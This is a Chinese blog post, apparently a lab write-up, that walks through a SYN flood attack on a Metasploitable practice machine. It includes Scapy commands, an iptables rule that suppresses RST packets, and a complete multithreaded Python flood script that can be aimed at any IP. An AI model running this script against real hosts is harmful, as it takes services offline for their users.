<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>2021-10-17 DDos攻击 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="2021-10-17 DDos攻击" />
<meta property="og:description" content="一、实验题目： DDos攻击
二、实验内容： 对 Metasploitable 靶机进行 Dos 攻击
三、环境准备： （1）kali虚拟机（python版本为3.6及以上）
（2）Metasploitable靶机
四、实验步骤： （1）查看Metasploitable靶机IP:
（2）在SYN FLOOD攻击发起之前，需要正常访问服务器上的web服务：
（3）打开wireshark对靶机进行抓包：
（4）在攻击开始之前，首先要发送阻断第三次客户端想服务端发的ack数据包，确保数据包正确：
命令：
scapy
i = IP()
i.dst = &#34;192.168.32.129&#34;
t = TCP()
t.dport = 80
sr1(i/t,verbose=1,timeout=2)
执行命令后观察抓包情况：
可以看到目标服务器成功给我们返回SYN&#43;ACK数据包，但是第三个数据包确实RST数据包而不是ACK数据包。原因：一开始的SYN数据包是我们使用scapy发出的，并不是操作系统自己主动发出的，所以当操作系统收到一个SYN&#43;ACK数据包时，它会认为这个连接不是我发出的，就会主动拒绝连接，并返回RST数据包。
（5）使用Linux下的iptables命令禁止系统自动给目标发送RST数据包，从而达到建立半开连接的效果：
命令：
iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.32.129 -j DROP
（6）创建SYN FLOOP攻击脚本：
（7）编辑脚本并保存：
代码如下：
#!/usr/bin/python
#coding:utf-8
from scapy.all import *
from time import sleep
import _thread
import random
def syn_flood(target,port):
while 1:" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/1327583e21f6e49148166c22084fe335/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-10-17T15:12:19+08:00" />
<meta property="article:modified_time" content="2021-10-17T15:12:19+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">2021-10-17 DDos攻击</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h4> <strong>一、实验题目：</strong></h4> 
<p>        DDos攻击<br>          </p> 
<h4>二、实验内容：</h4> 
<p>        <span style="color:#000000;">对 Metasploitable 靶机进行 Dos 攻击</span><br>            </p> 
<h4>三、环境准备：</h4> 
<p>（1）kali虚拟机（python版本为3.6及以上）</p> 
<p>（2）Metasploitable靶机</p> 
<p></p> 
<h4>四、实验步骤：</h4> 
<p><strong>（1）查看Metasploitable靶机IP:</strong></p> 
<p><img alt="" height="294" src="https://images2.imgbox.com/5b/1a/qXdELKyK_o.png" width="554"></p> 
<p></p> 
<p><strong> （2）在SYN FLOOD攻击发起之前，需要正常访问服务器上的web服务：</strong></p> 
<p> <img alt="" height="435" src="https://images2.imgbox.com/4e/5b/rMN3Hudv_o.png" width="554"></p> 
<p></p> 
<p></p> 
<p><strong> （3）打开wireshark对靶机进行抓包：</strong></p> 
<p><img alt="" height="433" src="https://images2.imgbox.com/3e/c4/ngtYTdGw_o.png" width="554"></p> 
<p><strong>（4）在攻击开始之前，首先要发送阻断第三次客户端想服务端发的ack数据包，确保数据包正确：</strong></p> 
<p><span style="color:#fe2c24;">        命令：</span></p> 
<blockquote> 
 <p style="text-align:justify;"><span style="color:#fe2c24;">scapy</span></p> 
 <p style="text-align:justify;"><span style="color:#fe2c24;">i = IP()</span></p> 
 <p style="text-align:justify;"><span style="color:#fe2c24;">i.dst = "192.168.32.129"</span></p> 
 <p style="text-align:justify;"><span style="color:#fe2c24;">t = TCP()</span></p> 
 <p style="text-align:justify;"><span style="color:#fe2c24;">t.dport = 80</span></p> 
 <p style="text-align:justify;"><span style="color:#fe2c24;">sr1(i/t,verbose=1,timeout=2)</span></p> 
</blockquote> 
<p>执行命令后观察抓包情况：</p> 
<p><img alt="" height="244" src="https://images2.imgbox.com/09/ef/ZpbuIUqM_o.png" width="553"></p> 
<p> 可以看到目标服务器成功给我们返回SYN+ACK数据包，但是第三个数据包确实RST数据包而不是ACK数据包。原因：一开始的SYN数据包是我们使用scapy发出的，并不是操作系统自己主动发出的，所以当操作系统收到一个SYN+ACK数据包时，它会认为这个连接不是我发出的，就会主动拒绝连接，并返回RST数据包。</p> 
<p><strong>（5）使用Linux下的iptables命令禁止系统自动给目标发送RST数据包，从而达到建立半开连接的效果：</strong></p> 
<p>      <span style="color:#fe2c24;">  命令：</span></p> 
<blockquote> 
 <p><span style="color:#fe2c24;">iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.32.129 -j DROP</span></p> 
</blockquote> 
<p><img alt="" height="200" src="https://images2.imgbox.com/5c/97/W3NiTrkm_o.png" width="554"></p> 
<p><strong>（6）创建SYN FLOOP攻击脚本：</strong></p> 
<p><img alt="" height="301" src="https://images2.imgbox.com/9d/c9/IgWpuHT5_o.png" width="416"></p> 
<p><strong>（7）编辑脚本并保存：</strong></p> 
<p>      <span style="color:#fe2c24;">  代码如下：</span></p> 
<blockquote> 
 <p><span style="color:#fe2c24;">#!/usr/bin/python<br> #coding:utf-8</span></p> 
 <p><span style="color:#fe2c24;">from scapy.all import *<br> from time import sleep<br> import _thread<br> import random</span></p> 
 <p><span style="color:#fe2c24;">def syn_flood(target,port):<br>     while 1:<br>         rand = random.randint(0,65535)<br>         send(IP(dst=target)/TCP(dport=port,sport=rand),verbose=0)</span></p> 
 <p><span style="color:#fe2c24;">def main():<br>     if len(sys.argv) != 4:<br>         print("参数错误，用法如下：")<br>         print("python syn_flood.py [IP] [port] [threadcount]")<br>         sys.exit()</span></p> 
 <p><span style="color:#fe2c24;">    target = sys.argv[1]<br>     port = int(sys.argv[2])<br>     thread_count = int(sys.argv[3])<br>     print("SYN Flood start,press Ctrl+C to stop.")<br>     for i in range(thread_count):<br>         _thread.start_new_thread(syn_flood,(target,port))<br>     while 1:<br>         sleep(1)</span></p> 
 <p><span style="color:#fe2c24;">if __name__ == "__main__":<br>     main()</span></p> 
</blockquote> 
<p><img alt="" height="558" src="https://images2.imgbox.com/2e/4f/8L4M4aBG_o.png" width="554"></p> 
<p><strong>（8）更新python（3.6版本及以上）</strong></p> 
<p>        <span style="color:#fe2c24;">命令：</span></p> 
<p><span style="color:#fe2c24;"> 查看python版本号：</span></p> 
<blockquote> 
 <p><span style="color:#fe2c24;">python -V</span></p> 
</blockquote> 
<p> <span style="color:#fe2c24;">更新python：</span></p> 
<blockquote> 
 <p><span style="color:#fe2c24;">update-alternatives --install /usr/bin/python python /usr/bin/python3 150</span></p> 
</blockquote> 
<p><img alt="" height="182" src="https://images2.imgbox.com/e8/29/wEONtMms_o.png" width="554"></p> 
<p><strong>（9）安装python管理工具pip：</strong></p> 
<p>      <span style="color:#fe2c24;">  命令：</span></p> 
<blockquote> 
 <p><span style="color:#fe2c24;">wget https://bootstrap.pypa.io/get-pip.py</span></p> 
</blockquote> 
<blockquote> 
 <p><span style="color:#fe2c24;">python get-pip.py</span></p> 
</blockquote> 
<p><img alt="" height="211" src="https://images2.imgbox.com/dc/5a/QRDf9zFy_o.png" width="554"></p> 
<p> <img alt="" height="161" src="https://images2.imgbox.com/37/6b/rb7VJIpQ_o.png" width="554"></p> 
<p><strong>（10）安装scapy：</strong></p> 
<p>     <span style="color:#fe2c24;">   命令：</span></p> 
<blockquote> 
 <p><span style="color:#fe2c24;">pip install scapy-python3</span></p> 
</blockquote> 
<p><img alt="" height="202" src="https://images2.imgbox.com/f8/2e/in1TBj6L_o.png" width="554"></p> 
<p><strong>（11）执行SYN FLOOP攻击脚本：</strong></p> 
<p>   <span style="color:#fe2c24;">     命令：</span></p> 
<blockquote> 
 <p><span style="color:#fe2c24;">python syn_flood.py IP 端口号 线程数</span></p> 
</blockquote> 
<p><img alt="" height="95" src="https://images2.imgbox.com/57/4d/iNHHcsHh_o.png" width="452"></p> 
<p><strong>（12）再次打开wireshark抓包，可以看到抓取到大量SYN请求数据包，而且已经没有RST数据包了：</strong></p> 
<p><img alt="" height="349" src="https://images2.imgbox.com/98/81/vcXOu7pe_o.png" width="554"></p> 
<p> <strong>（13）在metasploitable靶机上查看已建立的SYN连接数：</strong></p> 
<p>     <span style="color:#fe2c24;">   命令：</span></p> 
<blockquote> 
 <p><span style="color:#fe2c24;">netstat -pantu | grep SYN</span></p> 
</blockquote> 
<p><img alt="" height="303" src="https://images2.imgbox.com/c5/0e/E0zfGinL_o.png" width="554"></p> 
<p> 此时可以看到已经建立了大量连接。</p> 
<p></p> 
<h4>五、实验总结：</h4> 
<p style="margin-left:.0001pt;text-align:justify;">SYN FLOOD攻击的原理：</p> 
<p style="margin-left:.0001pt;text-align:justify;">        阻断TCP三次握手的第三次ACK包，即不对服务器发送的SYN+ACK数据包做出应答。由于服务器没有收到客户端发来的确认响应，就会一直保持连接直到超时，当有大量这种半开连接建立时，即造成SYN Flood攻击。</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p>感兴趣的小伙伴赶快去尝试一下吧！</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/9bb8ee724c3b02d7497284b37bcec772/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">C语言用程序实验哥德巴赫猜想</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/5881a544a7b00c2c667cee594352a85d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">几种编辑器的区别</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>